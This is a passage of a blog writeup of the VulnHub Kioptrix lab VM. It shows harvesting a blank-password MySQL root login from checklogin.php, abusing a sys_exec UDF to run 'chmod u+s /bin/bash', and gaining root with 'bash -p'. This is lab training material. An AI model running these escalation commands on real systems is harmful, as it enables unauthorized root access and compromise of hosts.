john      4889  0.0  0.1   5892  3820 pts/0    Ss   21:23   0:00 python /bin/kshell
john      4894  0.0  0.0   1772   484 pts/0    S    21:26   0:00 sh <span class="nt">-c</span> /bin/bash
john      4895  0.0  0.1   5444  2872 pts/0    S    21:26   0:00 /bin/bash
root      4969  0.0  0.0   4072  1588 pts/0    S+   21:49   0:00 bash <span class="nt">-p</span>
www-data  5330  0.0  0.2  20464  4396 ?        S    23:19   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5331  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5332  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5334  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5335  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5336  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5338  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5339  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5340  0.0  0.2  20488  4248 ?        S    23:19   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5343  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5345  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5346  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5347  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5348  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5349  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5350  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5351  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5352  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5353  0.0  0.1  20464  3764 ?        S    23:19   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5354  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5355  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5356  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5359  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5360  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5362  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5363  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5364  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5365  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5366  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5368  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5369  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5370  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5372  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5374  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5376  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5377  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5378  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5379  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5380  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5381  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5382  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5383  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5384  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5386  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5387  0.0  0.1  20464  3764 ?        S    23:20   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5388  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5389  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  5390  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
root      5393  0.0  0.1  11360  3720 ?        Ss   23:28   0:00 sshd: john <span class="o">[</span>priv]
john      5395  0.0  0.0  11516  1856 ?        R    23:29   0:00 sshd: john@pts/1 
john      5396  0.0  0.1   6000  3824 pts/1    Ss   23:29   0:00 python /bin/kshell
john      5403  0.0  0.0   1772   488 pts/1    S    23:32   0:00 sh <span class="nt">-c</span> /bin/bash
john      5404  0.0  0.0   4580  1856 pts/1    R    23:32   0:00 /bin/bash
john      5406  0.0  0.0   2644  1012 pts/1    R+   23:33   0:00 ps aux
bash-3.2<span class="nv">$ </span>
</code></pre></div></div>

<p>Pretty quiet, one thing that is to note is that <code class="language-plaintext highlighter-rouge">mysqld</code> is running as root. Let’s see if there are any MySQL creds laying around we can take advantage of. We can start by looking around the default <code class="language-plaintext highlighter-rouge">/var/www</code> web directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-3.2<span class="nv">$ </span><span class="nb">pwd</span>
/var/www
bash-3.2<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 44
drwxr-xr-x  5 root root 4096 2012-02-06 11:44 <span class="nb">.</span>
drwxr-xr-x 14 root root 4096 2012-02-04 09:57 ..
<span class="nt">-rw-r--r--</span>  1 root root 1477 2012-02-06 11:31 checklogin.php
<span class="nt">-rw-r--r--</span>  1 root root  298 2012-02-04 11:11 database.sql
drwxr-xr-x  2 root root 4096 2012-02-06 11:44 images
<span class="nt">-rw-r--r--</span>  1 root root 1255 2012-02-06 12:07 index.php
drwxr-xr-x  2 root root 4096 2012-02-04 18:33 john
<span class="nt">-rw-r--r--</span>  1 root root  176 2012-02-04 12:39 login_success.php
<span class="nt">-rw-r--r--</span>  1 root root   78 2012-02-04 11:33 logout.php
<span class="nt">-rw-r--r--</span>  1 root root  606 2012-02-06 15:42 member.php
drwxr-xr-x  2 root root 4096 2012-02-04 18:30 robert
bash-3.2<span class="nv">$ </span>
</code></pre></div></div>

<p>I won’t make you look in every file with me, eventually within <code class="language-plaintext highlighter-rouge">checklogin.php</code> we find the following:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$host</span><span class="o">=</span><span class="s2">"localhost"</span><span class="p">;</span> <span class="c1">// Host name</span>
<span class="nv">$username</span><span class="o">=</span><span class="s2">"root"</span><span class="p">;</span> <span class="c1">// Mysql username</span>
<span class="nv">$password</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span> <span class="c1">// Mysql password</span>
<span class="nv">$db_name</span><span class="o">=</span><span class="s2">"members"</span><span class="p">;</span> <span class="c1">// Database name</span>
<span class="nv">$tbl_name</span><span class="o">=</span><span class="s2">"members"</span><span class="p">;</span> <span class="c1">// Table name</span>
</code></pre></div></div>

<p>Nice, a root login with a blank password. Now let’s try to use these creds:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-3.2<span class="nv">$ </span>mysql <span class="nt">-u</span> <span class="s1">'root'</span> <span class="nt">-p</span>
Enter password: 
Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
Your MySQL connection <span class="nb">id </span>is 41
Server version: 5.0.51a-3ubuntu5.4 <span class="o">(</span>Ubuntu<span class="o">)</span>

Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the buffer.

mysql&gt; 
</code></pre></div></div>

<p>And we have a working MySQL session, note that within the <code class="language-plaintext highlighter-rouge">enter password:</code> line, I simply entered a blank password.</p>

<p>Cool, so normally at this point you might want to look around the tables within the various databases, but since we know MySQL is running as root, there’s some fun exploitation we can do.</p>

<p>There’s a great and quick <a href="https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/">blog post</a> that walks through this exploitation.</p>

<p>So, now knowing this (assuming you read the link), we can simply utilize <code class="language-plaintext highlighter-rouge">sys_exec</code> to do some fun stuff:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mysql</span><span class="o">&gt;</span> <span class="n">use</span> <span class="n">mysql</span><span class="p">;</span>
<span class="n">Reading</span> <span class="k">table</span> <span class="n">information</span> <span class="k">for</span> <span class="k">completion</span> <span class="k">of</span> <span class="k">table</span> <span class="k">and</span> <span class="k">column</span> <span class="k">names</span>
<span class="n">You</span> <span class="n">can</span> <span class="n">turn</span> <span class="k">off</span> <span class="n">this</span> <span class="n">feature</span> <span class="k">to</span> <span class="k">get</span> <span class="n">a</span> <span class="n">quicker</span> <span class="n">startup</span> <span class="k">with</span> <span class="o">-</span><span class="n">A</span>

<span class="k">Database</span> <span class="n">changed</span>
<span class="n">mysql</span><span class="o">&gt;</span> <span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="n">sys_exec</span><span class="p">(</span><span class="s1">'chmod u+s /bin/bash'</span><span class="p">);</span>
<span class="n">ERROR</span> <span class="mi">1064</span> <span class="p">(</span><span class="mi">42000</span><span class="p">):</span> <span class="n">You</span> <span class="n">have</span> <span class="n">an</span> <span class="n">error</span> <span class="k">in</span> <span class="n">your</span> <span class="k">SQL</span> <span class="n">syntax</span><span class="p">;</span> <span class="k">check</span> <span class="n">the</span> <span class="n">manual</span> <span class="n">that</span> <span class="n">corresponds</span> <span class="k">to</span> <span class="n">your</span> <span class="n">MySQL</span> <span class="n">server</span> <span class="k">version</span> <span class="k">for</span> <span class="n">the</span> <span class="k">right</span> <span class="n">syntax</span> <span class="k">to</span> <span class="n">use</span> <span class="n">near</span> <span class="s1">'mysql&gt; select sys_exec('</span><span class="n">chmod</span> <span class="n">u</span><span class="o">+</span><span class="n">s</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="s1">')'</span> <span class="k">at</span> <span class="n">line</span> <span class="mi">1</span>
<span class="n">mysql</span><span class="o">&gt;</span> <span class="n">use</span> <span class="n">mysql</span><span class="p">;</span>
<span class="k">Database</span> <span class="n">changed</span>
<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="n">sys_exec</span><span class="p">(</span><span class="s1">'chmod u+s /bin/bash'</span><span class="p">);</span>
<span class="o">+</span><span class="c1">---------------------------------+</span>
<span class="o">|</span> <span class="n">sys_exec</span><span class="p">(</span><span class="s1">'chmod u+s /bin/bash'</span><span class="p">)</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">---------------------------------+</span>
<span class="o">|</span> <span class="k">NULL</span>                            <span class="o">|</span> 
<span class="o">+</span><span class="c1">---------------------------------+</span>
<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">mysql</span><span class="o">&gt;</span> <span class="n">exit</span>
<span class="n">Bye</span>
<span class="n">bash</span><span class="o">-</span><span class="mi">3</span><span class="p">.</span><span class="mi">2</span><span class="err">$</span> <span class="n">bash</span> <span class="o">-</span><span class="n">p</span>
<span class="n">bash</span><span class="o">-</span><span class="mi">3</span><span class="p">.</span><span class="mi">2</span><span class="o">#</span> <span class="n">id</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">john</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">john</span><span class="p">)</span> <span class="n">euid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">john</span><span class="p">)</span>
<span class="n">bash</span><span class="o">-</span><span class="mi">3</span><span class="p">.</span><span class="mi">2</span><span class="o">#</span> <span class="n">cat</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">congrats</span><span class="p">.</span><span class="n">txt</span>
<span class="n">Congratulations</span><span class="o">!</span>
<span class="n">You</span><span class="s1">'ve got root.

There is more then one way to get root on this system. Try and find them.
I'</span><span class="n">ve</span> <span class="k">only</span> <span class="n">tested</span> <span class="n">two</span> <span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="n">methods</span><span class="p">,</span> <span class="n">but</span> <span class="n">it</span> <span class="n">doesn</span><span class="s1">'t mean there aren'</span><span class="n">t</span> <span class="k">more</span><span class="p">.</span>
<span class="k">As</span> <span class="n">always</span> <span class="n">there</span><span class="s1">'s an easy way, and a not so easy way to pop this box.
Look for other methods to get root privileges other than running an exploit.

It took a while to make this. For one it'</span><span class="n">s</span> <span class="k">not</span> <span class="k">as</span> <span class="n">easy</span> <span class="k">as</span> <span class="n">it</span> <span class="n">may</span> <span class="n">look</span><span class="p">,</span> <span class="k">and</span>
<span class="n">also</span> <span class="k">work</span> <span class="k">and</span> <span class="n">family</span> <span class="n">life</span> <span class="k">are</span> <span class="n">my</span> <span class="n">priorities</span><span class="p">.</span> <span class="n">Hobbies</span> <span class="k">are</span> <span class="n">low</span> <span class="k">on</span> <span class="n">my</span> <span class="n">list</span><span class="p">.</span>
<span class="n">Really</span> <span class="n">hope</span> <span class="n">you</span> <span class="n">enjoyed</span> <span class="n">this</span> <span class="n">one</span><span class="p">.</span>

<span class="n">If</span> <span class="n">you</span> <span class="n">haven</span><span class="s1">'t already, check out the other VMs available on:
www.kioptrix.com

Thanks for playing,
loneferret

bash-3.2# 
</span></code></pre></div></div>

<p>And that’s root! If you’re confused what we just did, first consider this for chmod:</p>

<p><em>“The operator + causes the selected file mode bits to be added to the existing file mode bits of each file”</em></p>

<p>So when we invoke <code class="language-plaintext highlighter-rouge">chmod u+s /bin/bash</code> We’re setting the user bit of us (root) to /bin/bash on execution.</p>

<p>Next, we simply execute <code class="language-plaintext highlighter-rouge">/bin/bash -p</code> and get an <em>effective user ID</em> of 0 (root). Note that this works because of the <code class="language-plaintext highlighter-rouge">-p</code> flag.. I skimmed through some documentation and this explanation of why this is neccessary is the best I could find:</p>

<p class="box-note">If the shell is started with the effective user (group) id not equal to the real user (group) id, 
and the -p option is not supplied, no startup files are read, shell functions are not inherited from the environment, 
the SHELLOPTS, BASHOPTS, CDPATH, and GLOBIGNORE variables, if they appear in the environment, 
are ignored, and the effective user id is set to the real user id. If the -p option is supplied at invocation, 
the startup behavior is the same, but the effective user id is not reset.</p>

<p>So yeah, basically if you don’t supply <code class="language-plaintext highlighter-rouge">-p</code> the effective user ID portion won’t work.</p>

<p>And that’s it! Rooted.</p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#enum4linux" class="page__taxonomy-item" rel="tag">enum4linux</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#ffuf" class="page__taxonomy-item" rel="tag">ffuf</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#restricted-shell-escapes" class="page__taxonomy-item" rel="tag">Restricted Shell Escapes</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#setuid" class="page__taxonomy-item" rel="tag">setuid</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#sql-injection" class="page__taxonomy-item" rel="tag">SQL Injection</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#vulnhub" class="page__taxonomy-item" rel="tag">VulnHub</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#vulnhub" class="page__taxonomy-item" rel="tag">VulnHub</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-07-29T00:00:00-04:00">July 29, 2020</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/Kioptrix-Level-1.2/" class="pagination--pager" title="Kioptrix Level 1.2 (#3) Writeup - VulnHub
">Previous</a>
    
    
      <a href="/FristiLeaks-1.3/" class="pagination--pager" title="FristiLeaks 1.3 Writeup - VulnHub
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
    <div id="results" class="results"></div></div>

      </div>
    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2021 Ash</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>





  </body>
</html>
